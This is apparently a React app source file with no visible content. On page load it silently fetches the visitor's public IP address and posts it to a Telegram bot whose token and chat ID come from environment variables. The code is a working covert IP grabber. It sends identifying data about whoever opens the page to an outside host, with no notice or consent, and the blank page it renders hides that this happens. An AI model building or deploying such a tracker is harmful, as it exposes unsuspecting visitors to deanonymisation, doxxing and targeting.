import { useEffect } from "react";

function App() {
  useEffect(() => {
    const apiUrl = "https://api.ipify.org?format=json";
    const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN; // Replace with your bot token
    const chatId = import.meta.env.VITE_CHAT_ID; // Replace with the chat ID (either a user or a group)

    async function getIPAddress() {
      try {
        const response = await fetch(apiUrl);
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error("Error fetching IP address:", error);
        return null;
      }
    }

    async function sendToTelegram(ip) {
      const message = `User's IP address is: ${ip}`;
      const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
      try {
        await fetch(telegramApiUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });
      } catch (error) {
        console.error("Error sending message to Telegram:", error);
      }
    }

    async function foo() {
      const ip = await getIPAddress();
      if (ip) {
        // Send the IP address to the Telegram bot automatically when the page loads
        await sendToTelegram(ip);
      } else {
        console.error("Unable to fetch your IP address.");
      }
    }

    foo();
  }, []);

  return <></>;
}

export default App;
